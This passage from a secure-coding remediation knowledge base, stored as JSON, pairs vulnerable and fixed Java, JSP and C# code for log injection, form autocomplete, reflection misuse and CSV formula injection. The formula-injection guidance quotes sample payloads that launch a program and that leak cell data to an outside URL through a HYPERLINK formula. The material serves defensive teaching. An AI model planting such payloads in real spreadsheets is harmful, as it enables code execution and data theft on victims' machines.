&lt;/exclusion&gt;\n\t\t\t&lt;/exclusions&gt;  \n</em>\t    &lt;/dependency&gt;\n\t\t\n\t\t&lt;dependency&gt;\n\t\t    <em class=\"blue\">&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n\t\t    &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;\n</em>\t\t    &lt;version&gt;2.14.0&lt;/version&gt;\n\t\t  &lt;/dependency&gt;\n\t\t  &lt;dependency&gt;\n\t\t<em class=\"blue\">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n\t\t    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</em>\n\t\t    &lt;version&gt;2.14.0&lt;/version&gt;\n\t\t  &lt;/dependency&gt;", "impact": "There are few things to consider while changing to log4j2.\n1) Apache log4j2 is not compatible with previous versions.\n2) XML configuration is simplified in log4j2 and is not compatible with log4j 1.x.\n3) The log entries created by log4j2, may have a different formating than log4j. Make sure to align the entries formatting, or align the changes with all automated system reading/using the generated logs (e.g.: rsyslog; Load balance; application monitoring; SIEM integrations; backup procedures; ETL; ...)\n\nFind the detailed list below:\nhttps://logging.apache.org/log4j/2.x/changelog.html", "abstract": "Use of log4j2"}, {"@type": "JAVA/JSP", "vulncode": "import org.slf4j.Log<em class=\"red\">ger;</em>\npublic ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString password = request.getParameter(&quot;pwd&quot;);\n\t\t<em class=\"red\">logger.debug(&quot;User Login with username&quot;+uname);</em>\n\t\t\t\n\t\tfinal String[] passwdArray = { null };\n\t\tGuardedString gs = new GuardedString(request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tgs.access(new GuardedString.Accessor() {\n\n            @Override\n            public void access(char[] decryptedChars) {\n                if (!(new String(decryptedChars)).equals(request.getParameter(&quot;pwd&quot;))) {\n                    System.out.println(&quot;Decrypted chars&quot;+decryptedChars);\n                } \n                \tpasswdArray[0] = new String(decryptedChars);\n            }\n        });\n\t\t\n\t\tchar[] chars = (request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tfor (int i = 0; i &lt; chars.length; i++)\n\t\t\tchars[i] = '\\0';\n\t\t\n\t\tbean=new LoginBean();\n\t\tbean.setUserName(uname);\n\t\tbean.setPassword(request.getParameter(&quot;pwd&quot;));\n.....\n}", "nonvulncode": "public ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString password = request.getParameter(&quot;pwd&quot;);\n\t\tlogger.debug(&quot;User Login with username&quot;<em class=\"blue\">+Encode.forHtmlAttribute(uname)</em>);\n\t\t\t\n\t\tfinal String[] passwdArray = { null };\n\t\tGuardedString gs = new GuardedString(request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tgs.access(new GuardedString.Accessor() {\n\n            @Override\n            public void access(char[] decryptedChars) {\n                if (!(new String(decryptedChars)).equals(request.getParameter(&quot;pwd&quot;))) {\n                    System.out.println(&quot;Decrypted chars&quot;+decryptedChars);\n                } \n                \tpasswdArray[0] = new String(decryptedChars);\n            }\n        });\n\t\t\n\t\tchar[] chars = (request.getParameter(&quot;pwd&quot;).toCharArray());\n\t\tfor (int i = 0; i &lt; chars.length; i++)\n\t\t\tchars[i] = '\\0';\n\t\t\n\t\tbean=new LoginBean();\n\t\tbean.setUserName(uname);\n\t\tbean.setPassword(request.getParameter(&quot;pwd&quot;));\n.....\n}", "comments": "There is possible way to use specific libraries to perform the encoding, like by use OWASP Java Encoder project Encode.forHtmlAttribute(String input) method. There are varied option like forHtmlAttribute, forHtmlContent, forJava, forJavaScript, forUri etc, depending on the requirement appropriate encoder needs to be used. \n\nFor reference: https://owasp.org/www-project-java-encoder/\n\n<em class=\"bold\">Dependency to be added in pom.xml</em>\n&lt;dependency&gt;\n\t&lt;groupId&gt;org.owasp.encoder&lt;/groupId&gt;\n\t&lt;artifactId&gt;encoder&lt;/artifactId&gt;\n\t&lt;version&gt;1.2.2&lt;/version&gt;\n&lt;/dependency&gt;\n\n<em class=\"bold\">//Import statement to be added</em>\nimport org.owasp.encoder.Encode;\n\nNOTE: The use of Encoder is a valid solution, but some SAST security tools may still flag as a vulnerability. In this case, the fixed code can be considered a false positive.", "impact": "The use of Encoder is a valid solution, but some SAST security tools may still flag as a vulnerability. In this case, the fixed code can be considered a false positive.\n\nImpact in performance is negligible, but requires a set of tests with special characters (e.g., Name=Ad\u00e3o will be encoded as Ad&atilde;o. The regression test must look at how this will propagate back to the database in case the user is editing another value and the name will change after the encoding is put in place).\nTest scenarios with special chars must be included into the test scripts: Understand the possible special characters that may be used by the normal software functionalities, and develop a strategy to present those properly.\nAdd Owasp_Java_Encoder to the artifact list.", "abstract": "Using OWASP encoder"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Privacy Violation: Autocomplete": {"language": "JAVA", "files": [{"file": "WebContent/WEB-INF/jspViews/login.jsp", "items": [{"id": "IN00446", "function": "null()", "line": "22", "snippet": "</tr>\n        <tr>\n         <td>Password :</td> <td><input type=\"password\" name=\"pwd\"></td><br>\n        </tr>\n        <tr><input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" /></tr>"}]}, {"file": "WebContent/WEB-INF/jspViews/addUser.jsp", "items": [{"id": "IN00447", "function": "null()", "line": "28", "snippet": "</tr>\n        <tr>\n         <td>Password:</td> <td><form:input type=\"password\" path=\"pwd\"/></td><br>\n        </tr>\n        <tr>"}]}], "remediation": {"remediation": {"@id": "R.0165", "@name": "Privacy Violation: Autocomplete", "@dateLastModified": "8/18/2020", "faqs": {"faq": {"question": "Why is this a security concern? The application UI/UX requires the auto-fill to be enabled.", "answer": "AutoComplete is a great usability addition to the web applications, but it can also complicate the user experience when not configured correctly."}}, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "&lt;form method=&quot;post&quot; action=&quot;action_form&quot;&gt;\n  &lt;div class=&quot;form-group&quot;&gt;\n        &lt;label for=&quot;fname&quot; class=&quot;control-label col-md-2&quot;&gt;First Name&lt;/label&gt;\n        &lt;input id = &quot;fname&quot; name=&quot;fname&quot; type=&quot;text&quot; autocomplete=&quot;given-name&quot; class=&quot;form-control&quot; /&gt; \n        &lt;/div&gt;\n        &lt;div class=&quot;form-group&quot;&gt;\n        &lt;label for=&quot;ssn&quot; class=&quot;control-label col-md-2&quot;&gt;Social Security Number&lt;/label&gt;\n        &lt;input id = &quot;ssn&quot; name=&quot;SSN&quot; type=&quot;text&quot; autocomplete=&quot;SSN-number&quot; class=&quot;form-control&quot; /&gt;\n        &lt;/div&gt;\n&lt;/form&gt;", "nonvulncode": "&lt;form method=&quot;post&quot; action=&quot;action_form&quot;&gt;\n  &lt;div class=&quot;form-group&quot;&gt;\n        &lt;label for=&quot;fname&quot; class=&quot;control-label col-md-2&quot;&gt;First Name&lt;/label&gt;\n        &lt;input id = &quot;fname&quot; name=&quot;fname&quot; type=&quot;text&quot; autocomplete=&quot;given-name&quot; class=&quot;form-control&quot; /&gt; \n        &lt;/div&gt;\n        &lt;div class=&quot;form-group&quot;&gt;\n        &lt;label for=&quot;ssn&quot; class=&quot;control-label col-md-2&quot;&gt;Social Security Number&lt;/label&gt;\n        &lt;input id = &quot;ssn&quot; name=&quot;SSN&quot; type=&quot;text&quot; <em class=\"blue\">autocomplete=&quot;off&quot;</em> class=&quot;form-control&quot; /&gt;\n        &lt;/div&gt;\n&lt;/form&gt;", "comments": "Autocomplete to sensitive information for input controls must be explicitly set to off (e.g., the social security number ), because by default this is on. \nFor more information check https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion\n\nFor options and compatibility chart see reference: https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/autocomplete", "impact": "Usability and user experience will change and needs to be validated with business.", "abstract": "Disabling autocomplete"}, {"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">login.jsp</em>\n&lt;form action=&quot;validate.html&quot; method=&quot;post&quot;&gt;<em class=\"red\"> //by default autocomplete is enabled</em>\n&lt;input type=&quot;hidden&quot; name=&quot;${_csrf.parameterName}&quot; value=&quot;${_csrf.token}&quot; /&gt;\n&lt;table align=&quot;center&quot;&gt;\n\t\t&lt;tr style=&quot;color:red&quot;&gt;&lt;center&gt;${msg}&lt;/center&gt;&lt;/tr&gt;\n        &lt;tr&gt;\n         &lt;td&gt;Username :&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;uname&quot;&gt;&lt;/td&gt;&lt;br&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n         &lt;td&gt;Password :&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;/td&gt;&lt;br&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;&lt;input type=&quot;hidden&quot; name=&quot;${_csrf.parameterName}&quot; value=&quot;${_csrf.token}&quot; /&gt;&lt;/tr&gt;\n        &lt;tr&gt;\n         &lt;td&gt;&lt;center&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; name=&quot;button&quot; class=&quot;btn&quot;&gt;&lt;/center&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n &lt;/table&gt;\n &lt;/form&gt;", "nonvulncode": "<em class=\"bold\">login.jsp</em>\n&lt;form action=&quot;validate.html&quot; method=&quot;post&quot;<em class=\"blue\"> autocomplete=&quot;off&quot;</em>&gt;\n&lt;input type=&quot;hidden&quot; name=&quot;${_csrf.parameterName}&quot; value=&quot;${_csrf.token}&quot; /&gt;\n&lt;table align=&quot;center&quot;&gt;\n\t&lt;tr style=&quot;color:red&quot;&gt;&lt;center&gt;${msg}&lt;/center&gt;&lt;/tr&gt;\n        &lt;tr&gt;\n         &lt;td&gt;Username :&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;uname&quot; <em class=\"blue\">autocomplete=&quot;username&quot;</em>&gt;&lt;/td&gt;&lt;br&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n         &lt;td&gt;Password :&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;/td&gt;&lt;br&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;&lt;input type=&quot;hidden&quot; name=&quot;${_csrf.parameterName}&quot; value=&quot;${_csrf.token}&quot; /&gt;&lt;/tr&gt;\n        &lt;tr&gt;\n         &lt;td&gt;&lt;center&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; name=&quot;button&quot; class=&quot;btn&quot;&gt;&lt;/center&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n &lt;/table&gt;\n &lt;/form&gt;", "comments": "Autocomplete to sensitive information for input controls must be explicitly set to off (e.g., SSN number). In the example, only the elements that, for business reasons, require autocomplete are se (e.g., given-name)\n\nFor more information check https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site\nhttps://www.w3.org/WAI/WCAG21/Techniques/html/H98", "impact": "Usability and user experience will change and needs to be validated with business.", "abstract": "Disabling autocomplete in form"}]}, "mitigations": {"mitigation": {"system": "Apache", "configuration": "httpd.conf\n\nBelow lines to be enabled in httpd.conf file\n\nLoadModule filter_module modules/mod_filter.so\nLoadModule substitute_module modules/mod_substitute.so\n\nAddOutputFilterByType SUBSTITUTE text/html\nSubstitute &quot;s|&lt;form|&lt;form autocomplete=\\&quot;off\\&quot;|qi&quot;", "backend": "N/A", "frontend": "N/A", "comments": "In some scenarios, the application must prevent saving form data on auto-complete for both security and usability reasons (e.g., public computer used to fill up forms; call center computers that manage multiple customer data; etc.).\n\nFor legacy application where the code cannot be easily modified and applications deployed on apache that requires mitigation, there is a way on apache to add &quot;autocomplete=off&quot; (turn off autocomplete) on every form elements rendered by the application. \n\nThis strategy forces all the form elements without an explicit autocomplete tag to be off. Individual Elements autocomplete configuration overloads this setting.\n\nReference:\nhttps://httpd.apache.org/docs/trunk/mod/mod_substitute.html\nhttps://httpd.apache.org/docs/trunk/mod/mod_filter.html\nhttps://html.spec.whatwg.org/multipage/forms.html#attr-fe-autocomplete"}}}}}, "Access Specifier Manipulation": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00452", "function": "setAccessible()", "line": "282", "snippet": "Person per = new Person();\n\t\t\tField field = Person.class.getDeclaredField(\"height\");\n\t        field.setAccessible(true);\n\t        field.set(per, \"162cm\");"}]}], "remediation": {"remediation": {"@id": "R.0051", "@name": "Access Specifier Manipulation", "@dateLastModified": "2/25/2021", "faqs": {"faq": {"question": "The code is using Reflections on @Test annotation to help on the Unit Test. Is this a problem?", "answer": "It is OK to use Reflections on testing, but should be avoided in production deployments. One very common use case in Java is the usage with annotations. JUnit 4, for example, will use reflection to look through the classes for methods tagged with the @Test annotation, and will then call them when running the unit test."}}, "recommendations": {"recommendation": [{"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">Person.java</em>\npublic class Person {\n\tprivate String height;\n\tprivate String weight;\n\tpublic Person() {\n\t}\n}\n\n<em class=\"bold\">EmployeeController.java\n\npublic</em> void accessPersonField(Person user, String heightVal) {\n//setting height to private field of Person\n\t\t\tField field = Person.class.getDeclaredField(&quot;height&quot;);\n\t   <em class=\"red\">     field.setAccessible(true);</em>\n\t        field.set(user, heightVal);\n}\n\npublic ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean) throws SQLException{\nString heightVal = userAccountBean.getHeight();\n<em class=\"bold\">\n</em>Person user = new Person();\naccessPersonField(user,heightVal);<em class=\"red\">\n</em>...\n}", "nonvulncode": "<em class=\"bold\">Person.java</em>\npublic class Person {\n\tprivate String height;\n\tprivate String weight;\n\tpublic Person() {\n\t}\n\tpublic String <em class=\"blue\">getHeight</em>() {\u200b\u200b\n\t\treturn height;\n\t}\u200b\u200b\n\tpublic void <em class=\"blue\">setHeight</em>(String height) {\u200b\u200b\n\t\tthis.height = height;\n\t}\u200b\u200b\n\tpublic String <em class=\"blue\">getWeight</em>() {\u200b\u200b\n\t\treturn weight;\n\t}\u200b\u200b\n\tpublic void <em class=\"blue\">setWeight</em>(String weight) {\u200b\u200b\n\t\tthis.weight = weight;\n\t}\u200b\u200b\n}\n\n<em class=\"bold\">EmployeeController.java\n\n</em>private void accessPersonField(Person user, String heightVal) {\n//setting height to private field of Person\n\t\t\tuser.<em class=\"blue\">setHeight</em>(heightVal);\n}\n\npublic ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean) throws SQLException{\nString heightVal = userAccountBean.getHeight();\n<em class=\"bold\">\n</em>Person user = new Person();\naccessPersonField(user,heightVal);<em class=\"red\">\n</em>...\n}", "comments": "Use the OOD conventions when working with Object Oriented Programming.\n\nInstead of using Reflections, create public set/get methods on the class definition and call those methods to manipulate the private object properties.\n\nThis will not violate Java security constraints such as data access protection and will be aligned with the OOP code definitions.", "impact": "Change the class definition to include get/set methods to the exposed variables.\nUse the get/set methods to manipulate the object properties.", "abstract": "Use get/set"}, {"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">Person.java</em>\npublic class Person {\n\tprivate String height;\n\tprivate String weight;\n\tpublic Person() {\n\t}\n}\n\n<em class=\"bold\">EmployeeController.java\n\npublic</em> void accessPersonField(Person user, String heightVal) {\n//setting height to private field of Person\n\t\t\tField field = Person.class.getDeclaredField(&quot;height&quot;);\n\t   <em class=\"red\">     field.setAccessible(true);</em>\n\t        field.set(user, heightVal);\n}\n\npublic ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean) throws SQLException{\nString heightVal = userAccountBean.getHeight();\n<em class=\"bold\">\n</em>Person user = new Person();\naccessPersonField(user,heightVal);<em class=\"red\">\n</em>...\n}", "nonvulncode": "<em class=\"bold\">Person.java</em>\npublic class Person {\n\tprivate String height;\n\tprivate String weight;\n\tpublic Person() {\n\t}\n}\n\n<em class=\"bold\">EmployeeController.java\n\nprivate</em> void accessPersonField(Person user, String heightVal) {\n//setting height to private field of Person\n\t\t\tField field = ReflectionUtils.findField(Person.class, &quot;height&quot;);\n\t\t\t<em class=\"blue\">ReflectionUtils.makeAccessible(field);</em>\n\t\t\tReflectionUtils.setField(field, user , heightVal);\n}\n\npublic ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean) throws SQLException{\nString heightVal = userAccountBean.getHeight();\n<em class=\"bold\">\n</em>Person user = new Person();\naccessPersonField(user,heightVal);<em class=\"red\">\n</em>...\n}", "comments": "With setAccessible, JVM's securityManager is accessed directly. With ReflectionUtils.makeAccessible, setAccessible(true) method is only called when actually necessary, to avoid unnecessary conflicts with a JVM SecurityManager. Also by defining the method private, you can restrict methods calls, to avoid unnecessary exposure of the field.\n\nReflection to be used only if its absolutely necessary, like creating libraries that work with objects in generic way.", "impact": "In the vuln and in the non-vulnerable cases, Reflection is in use and Developers must know the impacts of using Reflection:\n1) Slower than direct code \n2) More complex code\n3) increases code maintainability\n4) Violates Java security constraints such as data access protection.", "abstract": "Use of ReflectionUtils."}, {"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">Person.java</em>\npublic class Person {\n\tprivate String height;\n\tprivate String weight;\n\tpublic Person() {\n\t}\n}\n\n<em class=\"bold\">EmployeeController.java\n\npublic</em> void accessPersonField(Person user, String heightVal) {\n//setting height to private field of Person\n\t\t\tField field = Person.class.getDeclaredField(&quot;height&quot;);\n\t   <em class=\"red\">     field.setAccessible(true);</em>\n\t        field.set(user, heightVal);\n}\n\npublic ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean) throws SQLException{\nString heightVal = userAccountBean.getHeight();\n<em class=\"bold\">\n</em>Person user = new Person();\naccessPersonField(user,heightVal);<em class=\"red\">\n</em>...\n}", "nonvulncode": "<em class=\"bold\">Person.java\n</em>public class Person {\n\tprivate String height;\n\tprivate String weight;\n\tpublic Person() {\n\t}\n}\n<em class=\"bold\">PersonExt.java\npublic class Person</em>Ext <em class=\"blue\">extends Person </em>{\n\tpublic Person() {\n\t}\n\tpublic String <em class=\"blue\">getHeight</em>() {\u200b\u200b\n\t\treturn height;\n\t}\u200b\u200b\n\tpublic void <em class=\"blue\">setHeight</em>(String height) {\u200b\u200b\n\t\tthis.height = height;\n\t}\u200b\u200b\n\tpublic String <em class=\"blue\">getWeight</em>() {\u200b\u200b\n\t\treturn weight;\n\t}\u200b\u200b\n\tpublic void <em class=\"blue\">setWeight</em>(String weight) {\u200b\u200b\n\t\tthis.weight = weight;\n\t}\u200b\u200b\n}\n\n<em class=\"bold\">EmployeeController.java\n\n</em>private void accessPersonField(<em class=\"blue\">PersonExt</em> user, String heightVal) {\n//setting height to private field of Person\n\t\t\tuser.<em class=\"blue\">setHeight</em>(heightVal);\n}\n\npublic ModelAndView addUser(@ModelAttribute(&quot;userAccountBean&quot;) UserAccountBean userAccountBean) throws SQLException{\nString heightVal = userAccountBean.getHeight();\n<em class=\"bold\">\n</em>Person user = new Person();\naccessPersonField(user,heightVal);<em class=\"red\">\n</em>...\n}", "comments": "Use the OOD conventions when working with Object Oriented Programming.\n\nIf the developer do not have access to the original class (e.g. Person), or in case this class is created by other applications in the system, one option is to extend the class (e.g. PersonExt) and instead of using Reflections, create public set/get methods on the new extended class definition and call those methods to manipulate the private object properties.\n\nThis will not violate Java security constraints such as data access protection and will be aligned with the OOP code definitions.", "impact": "Change the class definition to include get/set methods to the exposed variables.\nUse the get/set methods to manipulate the object properties.", "abstract": "Extend a class with get/set"}]}, "mitigations": null}}}, "Formula Injection": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00455", "function": "com.opencsv.CSVWriter.writeNext()", "line": "483", "snippet": "String[] data1 = { santizeCSVData(name), empDtl.getGender(), empDtl.getCity()}; \n\t\t        writer.writeNext(data1); \n\t        }"}]}], "remediation": {"remediation": {"@id": "R.0120", "@name": "Formula Injection", "@dateLastModified": "1/20/2021", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "private void CreateEmployeeCSV([Bind(Include = &quot;Name,SocialSecurityNo&quot;)] EmployeeVM employee)\n        {\n            string csvfilePath = AppDomain.CurrentDomain.BaseDirectory.ToString() + &quot;\\\\UploadedFiles\\\\&quot; + employee.Name + &quot;_csvEmployee.csv&quot;; ;\n            string separator = &quot;,&quot;;\n\n            string csvOutput = <em class=\"red\">employee.Name + separator + employee.SocialSecurityNo;</em>\n            System.IO.File.WriteAllText(csvfilePath, csvOutput.ToString());\n            \n        }\n\npublic FileResult DownloadFile(string fileName)\n        {\n            \n                //Sanitization process start\n                var invalidFileNameChars = Path.GetInvalidFileNameChars();\n                fileName = invalidFileNameChars.Aggregate(fileName, (current, c) =&gt; current.Replace(c, '_'));\n                //Sanitization process end\n\n                string folderPath = AppDomain.CurrentDomain.BaseDirectory.ToString() + Path.DirectorySeparatorChar.ToString() + &quot;UploadedFiles&quot;;\n\n                if (!Directory.Exists(folderPath))\n                {\n                    Directory.CreateDirectory(folderPath);\n                }\n\n                string reportFile = Path.Combine(folderPath, fileName);\n                Response.ClearContent();\n                Response.Charset = string.Empty;\n                Response.Buffer = true;\n                Response.AddHeader(&quot;content-disposition&quot;, &quot;attachment; filename=&quot; + fileName);\n                Response.ContentType = &quot;application/vnd.ms-excel&quot;;\n\n            return File(reportFile, &quot;application/vnd.ms-excel&quot;); //File(Filepath, &quot;application/CSV&quot;,fileName);\n                \n        }", "nonvulncode": "private void CreateEmployeeCSV([Bind(Include = &quot;Name,SocialSecurityNo&quot;)] EmployeeVM employee)\n        {\n            string csvfilePath = AppDomain.CurrentDomain.BaseDirectory.ToString() + &quot;\\\\UploadedFiles\\\\&quot; + employee.Name + &quot;_csvEmployee.csv&quot;; ;\n            string separator = &quot;,&quot;;\n\n            string csvOutput =<em class=\"blue\"> StripStrip</em>(employee.Name) + separator + <em class=\"blue\">StripStrip</em>(employee.SocialSecurityNo);\n            System.IO.File.WriteAllText(csvfilePath, csvOutput.ToString());\n        }\n        private string StripStrip(string stringToStrip)\n        {\n            string startCharacter= stringToStrip.Substring(0,1);\n          <em class=\"blue\">  var match = startCharacter.IndexOfAny(new char[] { '=', '+', '-', '@' }) != -1;\n            if(match==true)\n            {\n                stringToStrip = stringToStrip.Substring(1);\n            }\n            return stringToStrip;\n        }\n\npublic FileResult DownloadFile(string fileName)\n        {\n            \n                //Sanitization process start\n                var invalidFileNameChars = Path.GetInvalidFileNameChars();\n                fileName = invalidFileNameChars.Aggregate(fileName, (current, c) =&gt; current.Replace(c, '_'));\n                //Sanitization process end\n\n                string folderPath = AppDomain.CurrentDomain.BaseDirectory.ToString() + Path.DirectorySeparatorChar.ToString() + &quot;UploadedFiles&quot;;\n\n                if (!Directory.Exists(folderPath))\n                {\n                    Directory.CreateDirectory(folderPath);\n                }\n\n                string reportFile = Path.Combine(folderPath, fileName);\n                Response.ClearContent();\n                Response.Charset = string.Empty;\n                Response.Buffer = true;\n                Response.AddHeader(&quot;content-disposition&quot;, &quot;attachment; filename=&quot; + fileName);\n                Response.ContentType = &quot;application/vnd.ms-excel&quot;;\n\n            return File(reportFile, &quot;application/vnd.ms-excel&quot;); //File(Filepath, &quot;application/CSV&quot;,fileName);\n                \n        }</em>", "comments": "May computers will have CSV files associated to programs like EXCEL or OPENOFFICE CALC. Those programs may be configured to understand formulas from the CSV file, and to auto-calculate those.\nWriting unsatinzed input the to spreadsheet (xsl, csv, etc.) could enable attacker to gain access to senstive data or inject malicious payload to completely compromise a user device. \n\nA few sample attack components can be:\n=cmd|'/C calc.exe'!Z0. - it will open the calculator. Any application can also be called here.\n=HYPERLINK(&quot;http://contextis.co.uk?leak=&quot;&A1&A2,&quot;Error: please click for further information&quot;), -this will direct to the site of the attacker if user click the link having thought it's a legitimate site.\n\nMore attacks sampmple can be found here in: https://medium.com/@ismailtasdelen/csv-injection-payload-list-e8e1deca6da5\n\nTo remediate, remove the following characters at the beginning of the string that will be written to the spreedsheet.\n\n- Equals to (\u201c=\u201d)\n- Plus (\u201c+\u201d)\n- Minus (\u201c-\u201c)\n- At (\u201c@\u201d)\n\nReference: https://owasp.org/www-community/attacks/CSV_Injection#:~:text=CSV%20Injection%2C%20also%20known%20as,the%20software%20as%20a%20formula.", "impact": "Regression test including the CSV processing after the changes is required. Any ETL system that processes the special characters need to be validated as well.", "abstract": "Sanitized Input"}, {"@type": "JAVA/JSP", "vulncode": "public ModelAndView createCSVFile (@RequestParam(value=&quot;name&quot;)<em class=\"red\">String name</em>) {\n\t\tModelAndView mv = new ModelAndView();\n\t\tString filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\generatedFile.csv&quot;;\n\t\tFile file = new File(filePath); \n\t\t  \n\t    try { \n\n\t        FileWriter outputfile = new FileWriter(file); \n\t        EmployeeSearchBean employeeSearch = new EmployeeSearchBean();\n\t        employeeSearch.setEmpName(name);\n\t        \n\t        ModelAndView searchDtlMV = searchEmployee(employeeSearch);\n\t        Map&lt;String,Object&gt; employeeDtl = searchDtlMV.getModel();\n\t        employeeSearch = (EmployeeSearchBean) employeeDtl.get(&quot;employeeSearchBean&quot;);\n\t        List&lt;EmployeeBean&gt; employeeList = employeeSearch.getEmployeeList();\n\t        CSVWriter writer = new CSVWriter(outputfile); \n\t  \t  \n\t        String[] header = { &quot;Name&quot;, &quot;Gender&quot;, &quot;City&quot; }; \n\t        writer.writeNext(header);\n\t  \n\t        for(EmployeeBean empDtl : employeeList) {\n\t         \t  <em class=\"red\">\n\t\t        String[] data1 = { name, empDtl.getGender(), empDtl.getCity()}; \n\t\t        writer.writeNext(data1); \n</em>\t        }\n\t  \n\t        writer.close(); \n\t    } \n\t    catch (IOException e) { \n\t        logger.error(&quot;Error during csv file creation. Try again with valid input&quot;);\n\t    } \n\t\t\n\t\treturn mv;\n\t}", "nonvulncode": "private String santizeCSVData (String data) {\n\t\tString sanitizedData = null;\n\t\tchar firstChar =  data.charAt(0);\n<em class=\"blue\">//appending ' (single quotes) to the data starting with +,=,@,-</em>\n\t\t<em class=\"blue\">if(data.startsWith(&quot;+&quot;) || data.startsWith(&quot;=&quot;) || data.startsWith(&quot;@&quot;) || data.startsWith(&quot;-&quot;)) {\n\t\t\tString appendQuotes = &quot;'&quot;+firstChar;\n\t\t\tString firstVal = Character.toString(firstChar);\n\t\t\tsanitizedData = data.replaceFirst(firstVal, appendQuotes);\n\t\t}</em>\t\n\t\treturn sanitizedData;\n\t}\n\npublic ModelAndView createCSVFile (@RequestParam(value=&quot;name&quot;)String name) {\n\t\tModelAndView mv = new ModelAndView();\n\t\tString filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\generatedFile.csv&quot;;\n\t\tFile file = new File(filePath); \n\t\t  \n\t    try { \n\n\t        FileWriter outputfile = new FileWriter(file); \n\t        EmployeeSearchBean employeeSearch = new EmployeeSearchBean();\n\t        employeeSearch.setEmpName(name);\n\t        \n\t        ModelAndView searchDtlMV = searchEmployee(employeeSearch);\n\t        Map&lt;String,Object&gt; employeeDtl = searchDtlMV.getModel();\n\t        employeeSearch = (EmployeeSearchBean) employeeDtl.get(&quot;employeeSearchBean&quot;);\n\t        List&lt;EmployeeBean&gt; employeeList = employeeSearch.getEmployeeList();\n\t        CSVWriter writer = new CSVWriter(outputfile); \n\t  \t  \n\t        String[] header = { &quot;Name&quot;, &quot;Gender&quot;, &quot;City&quot; }; \n\t        writer.writeNext(header);\n\t  \n\t        for(EmployeeBean empDtl : employeeList) {\n\t         \t  \n\t\t        String[] data1 = { <em class=\"blue\">santizeCSVData(name)</em>, empDtl.getGender(), empDtl.getCity()}; \n\t\t        writer.writeNext(data1); \n\t        }\n\t  \n\t        writer.close(); \n\t    } \n\t    catch (IOException e) { \n\t        logger.error(&quot;Error during csv file creation. Try again with valid input&quot;);\n\t    } \n\t\t\n\t\treturn mv;\n\t}", "comments": "May computers will have CSV files associated to programs like EXCEL or OPENOFFICE CALC. Those programs may be configured to understand formulas from the CSV file, and to auto-calculate those.\nWriting unsatinzed input the to spreadsheet (xsl, csv, etc.) could enable attacker to gain access to senstive data or inject malicious payload to completely compromise a user device. \n\nA few sample attack components can be:\n=cmd|'/C calc.exe'!Z0. - it will open the calculator. Any application can also be called here.\n=HYPERLINK(&quot;http://contextis.co.uk?leak=&quot;&A1&A2,&quot;Error: please click for further information&quot;), -this will direct to the site of the attacker if user click the link having thought it's a legitimate site.\n\nMore attacks sampmple can be found here in: https://medium.com/@ismailtasdelen/csv-injection-payload-list-e8e1deca6da5\n\n\nAttacker can exploit the application if we allow untrusted data into csv/excel file. It is recommended to append single quotes(') at the beginning of cell value, if any of the vulnerable characters(+,-,@,=) present by which we can avoid formula injection. By neutralizing/escaping, we ensure the cell values are interpreted as data, not as formula.\n\n- Equals to ('=)\n- Plus ('+)\n- Minus ('-)\n- At ('@)\n\nReference: https://owasp.org/www-community/attacks/CSV_Injection", "impact": "Regression test including the CSV processing after the changes is required. Any ETL system that processes the special characters need to be validated as well.", "abstract": "Use of single quotes(') at the beginning of cell value"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", 